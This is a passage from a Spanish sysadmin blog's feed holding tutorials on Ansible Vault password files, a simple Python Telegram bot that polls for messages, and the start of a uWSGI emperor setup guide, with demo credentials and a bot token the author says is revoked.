    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Otra forma, menos segura pero mas conveniente, es tener la contraseña en un fichero, y dejar que &lt;strong&gt;ansible&lt;/strong&gt; la lea de ese fichero. Esto es útil especialmente en &lt;em&gt;scripts&lt;/em&gt;, en donde suministrar una contraseña por el terminal no es factible.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat .vault-passfile &lt;/span&gt;
supersecret
~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping slaves --vault-password-file=.vault-passfile&lt;/span&gt;
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante recalcar que solo se puede indicar una contraseña para nuestros &lt;em&gt;vaults&lt;/em&gt;, sea por el terminal o por un fichero. Eso significa que todas las contraseñas usadas en un mismo comando deben ser las mismas.&lt;/p&gt;
&lt;h2&gt;Limpiando nuestras líneas de comandos&lt;/h2&gt;
&lt;p&gt;si el fichero de la &lt;em&gt;password&lt;/em&gt; es siempre el mismo, nuestros comandos van a ser largos y repetitivos. La gracia es que podemos ocultar los parámetros permanentes en el fichero de configuración de &lt;strong&gt;ansible&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat .ansible.cfg &lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;defaults&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;host_key_checking&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; False
&lt;span class="nv"&gt;vault_password_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; .vault-passfile
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, podemos omitirlo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# ansible -i inventory/ -m ping slaves&lt;/span&gt;
slave1 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
slave2 &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;SUCCESS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;changed&amp;quot;&lt;/span&gt;: false, 
    &lt;span class="s2"&gt;&amp;quot;ping&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;pong&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, este parámetro también afecta a otras herramientas, como por ejemplo el mismo comando &lt;strong&gt;ansible-vault&lt;/strong&gt;, por ejemplo, para inspeccionar el fichero encriptado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat inventory/vault &lt;/span&gt;
&lt;span class="nv"&gt;$ANSIBLE_VAULT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1&lt;span class="p"&gt;;&lt;/span&gt;AES256
&lt;span class="m"&gt;30313636313462346536346262333462633131633666653238313239333330343036346263653962&lt;/span&gt;
3862623363393436656334636361303263336333363431610a346666653539643065383765613466
&lt;span class="m"&gt;64626437633565323866316466636166623432313630323362393961383663356233626263386530&lt;/span&gt;
3539353266343237310a396536326337313232663466333361316666376364323634623638353865
&lt;span class="m"&gt;66323636336137303863643736636666353631613230633231386434373266343764343730653238&lt;/span&gt;
&lt;span class="m"&gt;38643462636330663864626237366631346439303739323030306336396266366666303262363735&lt;/span&gt;
&lt;span class="m"&gt;30303034333532336532306432643265653963646132393939386561326539646566613961393963&lt;/span&gt;
&lt;span class="m"&gt;62363633626135376532336137373631383839393231356265653932333639343762353937356439&lt;/span&gt;
&lt;span class="m"&gt;64346465323263623830306436636134613561646232663664306262383136646265383834306336&lt;/span&gt;
&lt;span class="m"&gt;62646537666135393032306338313166316631303134363363633833663862663933366436613461&lt;/span&gt;
&lt;span class="m"&gt;35343039646430393235383238653733343465653863363835303537383437613933306137636161&lt;/span&gt;
&lt;span class="m"&gt;37643432373531613565633431636461666661343561393764376239313637663362333136363237&lt;/span&gt;
&lt;span class="m"&gt;3131&lt;/span&gt;
~ &lt;span class="c1"&gt;# ansible-vault view inventory/vault&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;slaves:vars&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;ansible_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; ansible
&lt;span class="nv"&gt;ansible_ssh_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
&lt;span class="nv"&gt;ansible_become&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;ansible_become_method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; sudo
&lt;span class="nv"&gt;ansible_become_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; root
&lt;span class="nv"&gt;ansible_become_pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; s3cr3t
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, también sirve para encriptar, de forma que si lo hubiésemos puesto al principio, ni siquiera tendríamos que usarla para esa función. Para ir mas lejos, podríamos haber generado la &lt;em&gt;password&lt;/em&gt; de forma aleatorio y/o automatizada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;~ &lt;span class="c1"&gt;# cat aaaa &lt;/span&gt;
lorem ipsum
~ &lt;span class="c1"&gt;# ansible-vault encrypt aaaa &lt;/span&gt;
Encryption successful
~ &lt;span class="c1"&gt;# cat aaaa &lt;/span&gt;
&lt;span class="nv"&gt;$ANSIBLE_VAULT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1&lt;span class="p"&gt;;&lt;/span&gt;AES256
&lt;span class="m"&gt;38666531306261623531363836623436333061326536323066386139643630323336336565626663&lt;/span&gt;
6238383334333666376338363366353066333763393330340a353365343234646430393236356464
&lt;span class="m"&gt;62346166356430346564343539313436346661656335343733623836663563633630346138636661&lt;/span&gt;
3838633536383934360a343232306237373864616237386164376136323737373739623062306562
&lt;span class="m"&gt;3964&lt;/span&gt;
~ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto nos quedan los ficheros sensibles un poco mas protegidos, aunque no tenemos porque encriptarlos todos.&lt;/p&gt;</content><category term="ansible"></category><category term="vault"></category><category term="encriptación"></category><category term="inventario"></category></entry><entry><title>Escribiendo bots para Telegram</title><link href="http://www.linuxsysadmin.ml/2016/08/escribiendo-bots-para-telegram.html" rel="alternate"></link><published>2016-08-08T10:00:00+02:00</published><updated>2016-08-08T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-08-08:/2016/08/escribiendo-bots-para-telegram.html</id><summary type="html">&lt;p&gt;Aunque no está muy extendido, &lt;strong&gt;Telegram&lt;/strong&gt; es un magnífico cliente de mensajería instantánea. Tiene varios puntos a favor, como por ejemplo seguridad, rapidez y su condición de &lt;em&gt;libre&lt;/em&gt;. Lo que no se conoce tanto es que dispone de una &lt;em&gt;API&lt;/em&gt; para crear &lt;em&gt;bots&lt;/em&gt; que pueden responder automáticamente a sus usuarios …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Aunque no está muy extendido, &lt;strong&gt;Telegram&lt;/strong&gt; es un magnífico cliente de mensajería instantánea. Tiene varios puntos a favor, como por ejemplo seguridad, rapidez y su condición de &lt;em&gt;libre&lt;/em&gt;. Lo que no se conoce tanto es que dispone de una &lt;em&gt;API&lt;/em&gt; para crear &lt;em&gt;bots&lt;/em&gt; que pueden responder automáticamente a sus usuarios.&lt;/p&gt;
&lt;p&gt;La variedad de usos que se dan mediante estos &lt;em&gt;bots&lt;/em&gt; es muy variada. Personalmente he visto juegos, asistentes virtuales e incluso lo he usado para tener a mano las alarmas de un entorno de producción.&lt;/p&gt;
&lt;h2&gt;El token&lt;/h2&gt;
&lt;p&gt;Nuestro &lt;em&gt;bot&lt;/em&gt; es un ente propio, que tiene un &lt;em&gt;token&lt;/em&gt; de autenticación, de forma que solamente el que posea el &lt;em&gt;token&lt;/em&gt; pude responder como si fuera el &lt;em&gt;bot&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para conseguir el &lt;em&gt;token&lt;/em&gt; tenemos que iniciar una conversación con &lt;strong&gt;@BotFather&lt;/strong&gt;, que es el &lt;em&gt;bot&lt;/em&gt; que gobierna al resto. La interfaz es muy simple, y vale la pena de explorar; de momento me limito a resumir los comandos necesarios:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Iniciamos una conversación con &lt;strong&gt;BotFather&lt;/strong&gt; mediante el comando &lt;em&gt;/start&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Le indicamos que queremos un nuevo &lt;em&gt;bot&lt;/em&gt; mediante el comando &lt;em&gt;/newbot&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Le damos un nombre y un &lt;em&gt;username&lt;/em&gt;, tal como nos lo pide.&lt;/li&gt;
&lt;li&gt;El último paso es anotar el &lt;em&gt;token&lt;/em&gt; que nos ofrece &lt;strong&gt;BotFather&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Esto es todo lo que necesitamos para empezar a responder mensajes. Las conversaciones con el &lt;em&gt;bot&lt;/em&gt; se pueden iniciar buscando al &lt;em&gt;bot&lt;/em&gt; por su nombre o su &lt;em&gt;username&lt;/em&gt;. Obviamente, no tenemos nada todavía que responda a los &lt;em&gt;chats&lt;/em&gt; que se hagan a este nuevo &lt;em&gt;bot&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Hay dos formas de responder a este &lt;em&gt;bot&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Lo podemos configurar para que llame directamente a un &lt;em&gt;endpoint&lt;/em&gt; protegido con &lt;em&gt;HTTPS&lt;/em&gt; (requiere un certificado válido no autofirmado).&lt;/li&gt;
&lt;li&gt;Podemos tener un programa preguntando por nuevos mensajes periódicamente.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Como no tengo un servidor &lt;em&gt;HTTPS&lt;/em&gt; con certificado adecuado, vamos a ir por la segunda opción.&lt;/p&gt;
&lt;h2&gt;El script de respuesta&lt;/h2&gt;
&lt;p&gt;Vamos a escribir el &lt;em&gt;script&lt;/em&gt; en &lt;strong&gt;python&lt;/strong&gt; por su simplicidad y facilidad. Realmente se podría hacer con cualquier lenguaje, ya que se trata de hacer peticiones web a la &lt;em&gt;API&lt;/em&gt; e interpretarlas.&lt;/p&gt;
&lt;p&gt;Empezaremos por instalar una librería que nos va a facilitar bastante entender las peticiones y crear las respuestas. Lo vamos a hacer en un &lt;em&gt;virtualenv&lt;/em&gt; por limpieza.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/projects/telebot$ virtualenv env
New python executable in /home/gerard/projects/telebot/env/bin/python
Installing setuptools, pip, wheel...done.
gerard@sirius:~/projects/telebot$ . env/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/telebot$ pip install python-telegram-bot
Collecting python-telegram-bot
  Downloading python_telegram_bot-4.3.3-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;122kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 122kB 471kB/s 
Collecting certifi &lt;span class="o"&gt;(&lt;/span&gt;from python-telegram-bot&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading certifi-2016.2.28-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;366kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 368kB 514kB/s 
Collecting urllib3&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.10 &lt;span class="o"&gt;(&lt;/span&gt;from python-telegram-bot&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading urllib3-1.16-py2.py3-none-any.whl &lt;span class="o"&gt;(&lt;/span&gt;98kB&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="p"&gt;|&lt;/span&gt;████████████████████████████████&lt;span class="p"&gt;|&lt;/span&gt; 102kB 901kB/s 
Collecting future&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.15.2 &lt;span class="o"&gt;(&lt;/span&gt;from python-telegram-bot&lt;span class="o"&gt;)&lt;/span&gt;
Installing collected packages: certifi, urllib3, future, python-telegram-bot
Successfully installed certifi-2016.2.28 future-0.15.2 python-telegram-bot-4.3.3 urllib3-1.16
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; gerard@sirius:~/projects/telebot$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Realmente no hay mucho misterio; siguiendo la documentación se saca rápidamente un &lt;em&gt;script&lt;/em&gt;, al que llamaremos &lt;em&gt;run.py&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;telegram&lt;/span&gt;

&lt;span class="n"&gt;bot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;telegram&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Bot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;190363978:AAG0bHpIbidczVYUPhW9UwrwG3n5s54XSlE&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;bot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getMe&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;process_update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;unknown&amp;#39;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;UPPER &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;chat_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;chat_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;text&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;*Response*: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;parse_mode&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Markdown&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;bot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendMessage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;last_update&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;last_update&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;updates&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getUpdates&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;updates&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getUpdates&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;last_update&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;update&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;updates&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;process_update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;last_update&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update_id&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El &lt;em&gt;script&lt;/em&gt; es relativamente fácil de entender, así que solo os dejo algunas reflexiones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;El &lt;em&gt;token&lt;/em&gt; usado en &lt;em&gt;telegram.Bot()&lt;/em&gt; es el que nos dio el &lt;strong&gt;BotFather&lt;/strong&gt; (ha sido destruido, así que no penséis en vandalizar).&lt;/li&gt;
&lt;li&gt;Los &lt;em&gt;update_id&lt;/em&gt; son secuenciales; sin embargo, varias lecturas a la &lt;em&gt;API&lt;/em&gt; nos vuelven a traer todos los mensajes. La forma de que no nos los vuelva a dar es especificando un parámetro &lt;em&gt;offset&lt;/em&gt; (aunque en la primera iteración no lo tenemos).&lt;/li&gt;
&lt;li&gt;Se ha decidido por procesar cada &lt;em&gt;update&lt;/em&gt; en una función aparte, ya que cada &lt;em&gt;bot&lt;/em&gt; hará algo diferente con ellos.&lt;/li&gt;
&lt;li&gt;Este &lt;em&gt;bot&lt;/em&gt; de prueba solo va a devolvernos el mensaje que le pasemos en mayúsculas, y solo si este empieza por "UPPER". El resto devuelve "unknown".&lt;/li&gt;
&lt;li&gt;Las respuestas pueden contener lenguaje &lt;em&gt;wiki&lt;/em&gt;, en este caso, &lt;strong&gt;markdown&lt;/strong&gt;; pueden también definir teclados a medida con las respuestas posibles.&lt;/li&gt;
&lt;li&gt;Las respuestas conocen a su receptor mediante el campo &lt;em&gt;chat_id&lt;/em&gt;. Este campo se puede ver como un indicador de sesión, si vuestro &lt;em&gt;bot&lt;/em&gt; mantiene el estado de un "jugador" concreto.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La verdad es que es bastante simple la interfaz de la &lt;em&gt;API&lt;/em&gt;.  Con un poco de imaginación y una base de datos, es muy posible hacer un juego conversacional, sea con campos en la base de datos, o mediante una máquina de estados simple. Me quedo con esa idea para el futuro.&lt;/p&gt;</content><category term="telegram"></category><category term="bots"></category><category term="python"></category></entry><entry><title>El servidor de aplicaciones uWSGI</title><link href="http://www.linuxsysadmin.ml/2016/08/el-servidor-de-aplicaciones-uwsgi.html" rel="alternate"></link><published>2016-08-01T10:00:00+02:00</published><updated>2016-08-01T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-08-01:/2016/08/el-servidor-de-aplicaciones-uwsgi.html</id><summary type="html">&lt;p&gt;Estaba yo el otro día buscando un servidor de aplicaciones para aplicaciones &lt;em&gt;python&lt;/em&gt;, y entre todas las opciones encontré uno que es una auténtica joya: &lt;strong&gt;uWSGI&lt;/strong&gt;. Se trata de un servidor modular, que permite servir un amplio abanico de posibilidades en cuanto a lenguajes se refiere, usando un &lt;em&gt;plugin&lt;/em&gt; adecuado …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Estaba yo el otro día buscando un servidor de aplicaciones para aplicaciones &lt;em&gt;python&lt;/em&gt;, y entre todas las opciones encontré uno que es una auténtica joya: &lt;strong&gt;uWSGI&lt;/strong&gt;. Se trata de un servidor modular, que permite servir un amplio abanico de posibilidades en cuanto a lenguajes se refiere, usando un &lt;em&gt;plugin&lt;/em&gt; adecuado.&lt;/p&gt;
&lt;p&gt;Concretamente me llamó la atención el modo de funcionamiento llamado &lt;em&gt;emperor&lt;/em&gt;, que es un proceso que se dedica a monitorizar una carpeta concreta, de forma que se asegura de que cada fichero de configuración mantiene levantada una instancia que la sirva.&lt;/p&gt;
&lt;p&gt;Si levantamos el &lt;em&gt;emperor&lt;/em&gt;, leerá la carpeta de &lt;em&gt;vassals&lt;/em&gt;, levantando todos los que entienda. Si añadimos un fichero de configuración nuevo en caliente, levantará una instancia nueva. Si eliminamos un fichero de configuración, matará la instancia referida. Finalmente, si ese mismo fichero de configuración se modifica (un &lt;em&gt;touch&lt;/em&gt; vale), se adaptará a las nuevas directrices, recargando el código de nuestra aplicación.&lt;/p&gt;
&lt;p&gt;Vamos a empezar instalando la variante &lt;em&gt;emperor&lt;/em&gt;, que no es mas que el &lt;strong&gt;uwsgi&lt;/strong&gt; básico, con una configuración de &lt;em&gt;emperor&lt;/em&gt; y un &lt;em&gt;init script&lt;/em&gt; adecuado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install -y uwsgi-emperor
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
...  
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;11&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;2&lt;/span&gt;.258 kB de archivos.
Se utilizarán &lt;span class="m"&gt;5&lt;/span&gt;.724 kB de espacio de disco adicional después de esta operación.
..  
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para entender un lenguaje cualquiera, hay que declarar el uso de un &lt;em&gt;plugin&lt;/em&gt; para ese lenguaje. Vamos a poner los &lt;em&gt;plugins&lt;/em&gt; para tres de los lenguajes mas utilizados, que nos van a servir como demostración para este artículo: &lt;strong&gt;python&lt;/strong&gt;, &lt;strong&gt;PHP&lt;/strong&gt; y &lt;strong&gt;ruby&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install -y uwsgi-plugin-python uwsgi-plugin-php uwsgi-plugin-rack-ruby2.1
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
...  
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;22&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;12&lt;/span&gt;,0 MB de archivos.
